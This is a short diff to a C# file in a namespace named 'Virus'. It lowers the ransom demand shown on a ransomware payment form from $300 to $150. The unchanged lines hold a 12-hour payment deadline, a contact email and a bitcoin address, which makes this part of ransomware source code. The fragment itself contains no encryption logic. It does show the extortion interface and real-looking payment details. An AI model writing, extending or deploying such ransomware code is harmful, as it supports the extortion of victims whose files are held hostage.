@@ -16,7 +16,7 @@ namespace Virus
     public partial class Form2 : Form
     {
         public static int _timetopay = 12;
-        public static string _ransomAmount = "$300";
+        public static string _ransomAmount = "$150";
         public static string _safeEmail = "getyourprivkey@protonmail.com";
         public static string _bitcoinAddress = "16YzUQfVeZpKoSpPeTyUgBRmBdfg8ABHZp";
         public DateTime DateTimePlus12Hours;
